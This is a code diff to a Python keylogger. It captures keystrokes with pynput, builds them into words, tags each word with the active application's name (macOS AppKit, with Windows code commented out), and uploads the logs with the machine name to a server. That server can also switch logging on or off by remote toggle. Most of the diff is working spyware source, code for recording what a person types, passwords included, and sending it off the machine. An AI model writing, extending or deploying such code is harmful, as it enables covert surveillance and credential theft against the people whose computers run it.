@@ -7,19 +7,34 @@ from pynput.keyboard import Key
 from cryptography.fernet import Fernet
 import platform
 
+# Windows
+# import win32gui
 
+# macOS
+from AppKit import NSWorkspace
 
 class KeyLoggerService:
     def __init__(self):
         self.key_log_dict = {}
         self.all_logs = []
+        self.current_word = ""
 
     def add_key(self, key):
-        now_time = time.strftime("YYYY-MM-DD HH:MM:SS", time.localtime())
-        if now_time in self.key_log_dict:
-            self.key_log_dict[now_time].append(str(key))
-        else:
-            self.key_log_dict[now_time] = [str(key)]
+        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
+        app_name = self.get_active_application()
+        key_str = str(key).replace("'", "")
+        if key == Key.space:
+            if self.current_word:
+                if now_time in self.key_log_dict:
+                    self.key_log_dict[now_time].append({"key": self.current_word, "app": app_name})
+                else:
+                    self.key_log_dict[now_time] = [{"key": self.current_word, "app": app_name}]
+                self.current_word = ""
+        elif key_str.isalnum() or key_str == "Key.backspace":
+            if key_str == "Key.backspace" and self.current_word:
+                self.current_word = self.current_word[:-1]
+            elif key_str != "Key.backspace":
+                self.current_word += key_str
 
     def save_and_clear(self):
         if self.key_log_dict:
@@ -33,19 +48,30 @@ class KeyLoggerService:
     def clear_logs(self):
         self.all_logs = []
 
-# class FileWriter:
-#     @staticmethod
-#     def write_to_file(logs, machine_name= platform.node()):
-#         new_task = {
-#             "machine": machine_name,
-#             "data": logs
-#         }
-#         with open("log.json", "a", encoding="utf-8") as log_file:
-#             json.dump(new_task, log_file, indent=2, ensure_ascii=False)
-#             log_file.write("\n")
+    @staticmethod
+    def get_active_application():
+
+        # Windows
+        # if platform.system() == "Windows":
+        # hwnd = win32gui.GetForegroundWindow()
+        # return win32gui.GetWindowText(hwnd) or "Unknown"
+
+        # macOS
+        if platform.system() == "Darwin":
+            active_app = NSWorkspace.sharedWorkspace().activeApplication()
+            return active_app.get("NSApplicationName", "Unknown")
+        return "Unsupported"
+
+    def format_logs(self):
+        result = []
+        for log_dict in self.all_logs:
+            for time_key, entries in log_dict.items():
+                for entry in entries:
+                    result.append(f"[{time_key}] ({entry['app']}): {entry['key']}")
+        return "\n".join(result)
 
 class ServerSender:
-    def __init__(self, server_url, service, machine_name= platform.node() ):
+    def __init__(self, server_url, service, machine_name=platform.node()):
         self.server_url = server_url
         self.service = service
         self.machine_name = machine_name
@@ -69,7 +95,6 @@ class ServerSender:
                         print(f"Upload failed: {response.status_code} {response.text}")
                     else:
                         print("Upload OK")
-                        # Clear logs only on successful upload
                         self.service.clear_logs()
                 except requests.exceptions.RequestException as e:
                     print(f"Error sending data: {e}")
@@ -78,19 +103,16 @@ class ServerSender:
 class KeyLoggerManager:
     def __init__(self):
         self.service = KeyLoggerService()
-        # self.file_writer = FileWriter()
         self.machine_name = platform.node()
         self.server_base = "http://127.0.0.1:5000"
         self.server_sender = ServerSender(f"{self.server_base}/api/upload", self.service, self.machine_name)
         self.listener = None
-        # Start background poller to follow desired toggle state from server
         threading.Thread(target=self._poll_toggle_state, daemon=True).start()
 
     def handle_key_press(self, key):
         self.service.add_key(key)
         if key == Key.space:
             self.service.save_and_clear()
-            # self.file_writer.write_to_file(logs)
 
     def start(self):
         if not self.listener:
